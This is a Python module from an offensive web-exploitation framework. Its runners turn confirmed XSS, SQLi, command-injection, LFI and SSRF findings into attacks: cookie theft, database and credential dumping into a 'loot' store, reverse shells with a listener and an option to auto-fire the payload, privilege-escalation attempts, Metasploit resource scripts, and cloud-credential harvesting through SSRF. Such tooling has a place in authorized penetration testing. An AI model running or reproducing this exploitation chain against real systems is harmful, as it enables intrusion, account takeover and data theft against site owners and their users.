"""Result-processor runners (XSS / CSRF / SQLi / CMDi / autopwn / LFI / SSRF)."""

from __future__ import annotations


# ── Result processor runners ────────────────────────────────────────────────

def _run_xss_postprocess(state):
    from modules.xss_exploit import run_xss_exploit, run_xss_exploit_interactive
    from modules.browser_exploit import run_browser_xss_exploit, PLAYWRIGHT_AVAILABLE
    from utils.colors import Colors, log_info, log_error
    from utils.loot_manager import LootManager

    options = state.get("options", {})
    xss_vulns = state.get("xss_vulns", [])
    if not xss_vulns or not options.get("exploit"):
        return []

    log_info(f"Found {len(xss_vulns)} XSS vulns. Generating exploit payloads...")
    exploit_results = run_xss_exploit(xss_vulns, suppress_output=True)

    # Auto-save stolen cookies if any (from server interactions)
    loot = LootManager(state.get("scan_dir", "/tmp"))
    if exploit_results:
        for result in exploit_results:
            stolen = result.get("stolen_data", [])
            if stolen:
                loot.save_cookies(stolen)

    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] XSS Exploit Options:\n"
        f"  1) Interactive Server (wait for victims to click)\n"
        f"  2) Headless Browser (auto-execute payload in-process)\n"
        f"  3) Skip"
        f"{Colors.END}"
    )
    choice = state["prompt_input"]("Choice [1/2/3]:", "3").strip()

    if choice == "1":
        run_xss_exploit_interactive(xss_vulns)
    elif choice == "2":
        if not PLAYWRIGHT_AVAILABLE:
            log_error("Playwright not installed. Skipping headless exploit.")
            return []
            
        for vuln in xss_vulns:
            # Re-generate exploits to grab an exploit_url
            res = run_xss_exploit([vuln], suppress_output=True)
            if res and res[0].get("exploits"):
                # Grab the first URL-based exploit (typically param-based GET)
                for exp in res[0]["exploits"]:
                    url = exp.get("exploit_url")
                    if url:
                        p_res = run_browser_xss_exploit(vuln, url)
                        if p_res:
                            # Save cookies to LootManager
                            cookies = p_res.get("cookies", [])
                            if cookies:
                                # Convert Playwright cookie format slightly if needed
                                formatted = [{"cookie": f"{c['name']}={c['value']}", "source_ip": "playwright_headless"} for c in cookies]
                                loot.save_cookies(formatted)
                        break

    return []


def _run_csrf_exploit(state):
    """Mark CSRF findings for PoC generation by the dedicated PoC phase.

    The actual HTML PoC is produced in `_run_poc_generation` →
    `modules.poc_generator.generate_pocs`, which now recognises
    `type == "CSRF"` findings and writes a self-submitting form.
    """
    from utils.colors import Colors, log_info

    options = state.get("options", {})
    csrf_vulns = state.get("csrf_vulns", [])
    if not csrf_vulns or not options.get("exploit"):
        return []

    log_info(f"Found {len(csrf_vulns)} CSRF vulns.")
    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] Generate CSRF PoC Exploits? (y/N)"
        f"{Colors.END}"
    )
    choice = state["prompt_input"]("Choice:", "N").lower()

    if choice != "y":
        return []

    # Ensure CSRF vulns are present in all_vulns so generate_pocs picks them up.
    all_vulns = state.setdefault("all_vulns", [])
    existing_urls = {v.get("url") for v in all_vulns if v.get("type") == "CSRF"}
    for vuln in csrf_vulns:
        if vuln.get("url") in existing_urls:
            continue
        all_vulns.append({**vuln, "type": "CSRF"})
    log_info("CSRF findings staged for PoC generation phase.")
    return []


def _run_sqli_postprocess(state):
    from modules.sqli import scan_blind_sqli
    from modules.sqli_exploit import run_sqli_exploit
    from utils.colors import Colors, log_info, log_success, log_warning
    from utils.loot_manager import LootManager

    options = state.get("options", {})
    sqli_vulns = state.get("sqli_vulns", [])
    if not sqli_vulns or not options.get("exploit"):
        return []

    loot = LootManager(state.get("scan_dir", "/tmp"))

    if sqli_vulns:
        log_info(f"Found {len(sqli_vulns)} SQLi vulns. Attempting exploit...")
        for vuln in sqli_vulns:
            if "exploit_data" not in vuln:
                exploit_data = run_sqli_exploit(vuln)
                if exploit_data:
                    vuln["exploit_data"] = exploit_data
                    log_success("Exploitation successful! Data added to report.")

                    # Auto-save loot
                    db_name = exploit_data.get("database", "unknown")
                    tables = exploit_data.get("tables", [])
                    if tables:
                        loot.save_schema_info(db_name, tables)
                    for tbl, tbl_data in exploit_data.get("data", {}).items():
                        rows = tbl_data.get("rows", [])
                        cols = tbl_data.get("columns", [])
                        if rows:
                            loot.save_sqli_dump(
                                db_name, tbl, cols, rows,
                                blind=exploit_data.get("blind", False),
                            )
                            # If it looks like credentials, save separately
                            if any("pass" in c.lower() for c in cols):
                                loot.save_credentials(f"sqli_{tbl}", rows)

    extracted_data = any(v.get("exploit_data", {}).get("database") for v in sqli_vulns)
    if sqli_vulns and extracted_data:
        log_info(
            "Union-based SQLi successfully extracted data — skipping Blind SQLi (redundant)"
        )
        loot.summary()
        return []

    if sqli_vulns:
        log_warning(
            "Union SQLi found but data extraction failed. Falling back to Blind SQLi..."
        )

    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] Run Blind SQLi? "
        f"(slow, time-based) (y/N)"
        f"{Colors.END}"
    )
    blind_choice = state["prompt_input"]("Choice:", "N").lower()
    if blind_choice != "y":
        return []

    log_info("Running Time-Based Blind SQLi checks...")
    blind_vulns = scan_blind_sqli(state["scan_url"], state["forms"], state["delay"])
    if blind_vulns:
        log_info(f"Found {len(blind_vulns)} Blind SQLi vulns. Attempting exploit...")
        for vuln in blind_vulns:
            if "exploit_data" not in vuln:
                exploit_data = run_sqli_exploit(vuln)
                if exploit_data:
                    vuln["exploit_data"] = exploit_data
                    log_success("Blind Exploitation successful! Data added to report.")

    loot.summary()
    return blind_vulns


def _run_cmdi_postprocess(state):
    from modules.cmdi_shell import InteractiveShell
    from utils.colors import Colors, log_info
    from utils.revshell import auto_generate_for_vuln, print_shells, get_local_ip
    from utils.reverse_listener import start_reverse_listener

    options = state.get("options", {})
    cmdi_vulns = state.get("cmdi_vulns", [])
    if not cmdi_vulns or not options.get("exploit"):
        return []

    log_info(f"Found {len(cmdi_vulns)} Command Injection vulns.")
    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] CMDi Exploit Options:\n"
        f"  1) Interactive Pseudo-Shell\n"
        f"  2) Reverse Shell (catch TTY connection)\n"
        f"  3) Auto Privilege Escalation Scan\n"
        f"  4) Skip"
        f"{Colors.END}"
    )
    choice = state["prompt_input"]("Choice [1/2/3/4]:", "4").strip()

    if choice == "1":
        shell = InteractiveShell(state["scan_url"], cmdi_vulns[0])
        shell.run()
    elif choice == "2":
        port = int(options.get("revshell_port", 4444))
        attacker_ip = get_local_ip()

        # Generate best-fit shell payloads
        shells = auto_generate_for_vuln(cmdi_vulns[0], ip=attacker_ip, port=port)
        if shells:
            print_shells(shells, max_display=3)

        # Start listener
        listener = start_reverse_listener(port=port, timeout=120)
        if listener:
            log_info(
                "Listener ready. Inject the payload above into the target, "
                "or press Ctrl+C to cancel."
            )

            # Use the interactive CMDi shell to fire the payload automatically
            print(
                f"\n{Colors.BOLD}{Colors.CYAN}"
                f"[?] Auto-fire top payload via CMDi injection? (y/N)"
                f"{Colors.END}"
            )
            auto = state["prompt_input"]("Choice:", "N").lower()
            if auto == "y" and shells:
                fire_shell = InteractiveShell(state["scan_url"], cmdi_vulns[0])
                fire_shell.execute(shells[0]["command"])
                log_info("Payload sent! Waiting for connection …")

            if listener.wait_for_connection(timeout=120):
                listener.interact()
            listener.stop()

    elif choice == "3":
        from modules.privesc_scanner import PrivEscScanner

        shell = InteractiveShell(state["scan_url"], cmdi_vulns[0])
        if shell.check_connection():
            scanner = PrivEscScanner(shell)
            findings = scanner.scan_all()
            if findings.get("suggestions"):
                print(
                    f"\n{Colors.BOLD}{Colors.CYAN}"
                    f"[?] Auto-attempt top escalation path? (y/N)"
                    f"{Colors.END}"
                )
                esc_choice = state["prompt_input"]("Choice:", "N").lower()
                if esc_choice == "y":
                    top = findings["suggestions"][0]
                    log_info(f"Executing: {top['command']}")
                    output = shell.execute(top["command"])
                    if output:
                        print(output)

    return []


def _run_autopwn_postprocess(state):
    from utils.autopwn import generate_msf_resource, generate_nuclei_command
    from utils.colors import Colors

    options = state.get("options", {})
    if not options.get("exploit"):
        return []

    all_vulns = state.get("all_vulns", [])
    if not all_vulns:
        return []

    target = state.get("url", "")
    scan_dir = state.get("scan_dir", "/tmp")
    lhost = options.get("msf_lhost")
    lport = int(options.get("msf_lport", 4444))

    # Generate MSF resource script
    rc_path = generate_msf_resource(
        all_vulns, target, lhost=lhost, lport=lport, output_dir=scan_dir
    )

    # Generate Nuclei command
    tech_results = state.get("tech_results")
    nuclei_cmd = generate_nuclei_command(target, tech_results=tech_results, vulns=all_vulns)

    if rc_path or nuclei_cmd:
        print(
            f"\n{Colors.BOLD}{Colors.CYAN}"
            f"[*] Auto-Pwn artifacts generated in {scan_dir}"
            f"{Colors.END}"
        )

    return []


def _run_lfi_postprocess(state):
    """Auto-exploit confirmed LFI vulns: deep file harvesting via DeepLFIExploit."""
    from modules.lfi_exploit import DeepLFIExploit
    from utils.colors import Colors, log_success
    from utils.loot_manager import LootManager

    options = state.get("options", {})
    if not options.get("exploit"):
        return []

    lfi_vulns = [v for v in state.get("all_vulns", []) if "LFI" in v.get("type", "")]
    if not lfi_vulns:
        return []

    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] {len(lfi_vulns)} LFI vuln(s) found. Deep file harvesting? (y/N)"
        f"{Colors.END}"
    )
    choice = state["prompt_input"]("Choice:", "N").lower()
    if choice != "y":
        return []

    scan_dir = state.get("scan_dir", "/tmp")
    loot = LootManager(scan_dir)
    exploit = DeepLFIExploit(loot_manager=loot)

    for vuln in lfi_vulns:
        extracted = exploit.auto_exploit(vuln)
        if extracted:
            vuln["deep_lfi_data"] = {
                "files_extracted": len(extracted),
                "file_list": list(extracted.keys()),
            }
            log_success(f"Deep LFI: {len(extracted)} files harvested!")

    loot.summary()
    return []


def _run_ssrf_postprocess(state):
    """Auto-exploit confirmed SSRF vulns: internal port scan + cloud credential harvest."""
    from modules.ssrf_exploit import DeepSSRFExploit
    from utils.colors import Colors, log_success
    from utils.loot_manager import LootManager

    options = state.get("options", {})
    if not options.get("exploit"):
        return []

    ssrf_vulns = [v for v in state.get("all_vulns", []) if "SSRF" in v.get("type", "")]
    if not ssrf_vulns:
        return []

    print(
        f"\n{Colors.BOLD}{Colors.CYAN}"
        f"[?] {len(ssrf_vulns)} SSRF vuln(s) found. Deep SSRF exploitation? (y/N)"
        f"{Colors.END}"
    )
    choice = state["prompt_input"]("Choice:", "N").lower()
    if choice != "y":
        return []

    scan_dir = state.get("scan_dir", "/tmp")
    loot = LootManager(scan_dir)
    exploit = DeepSSRFExploit(loot_manager=loot)

    for vuln in ssrf_vulns:
        results = exploit.full_exploit(vuln)
        if results:
            vuln["deep_ssrf_data"] = {
                "open_ports": len(results.get("open_ports", {})),
                "cloud_entries": len(results.get("cloud_data", {})),
            }
            log_success(
                f"Deep SSRF: {len(results.get('open_ports', {}))} open ports, "
                f"{len(results.get('cloud_data', {}))} cloud entries"
            )

    loot.summary()
    return []


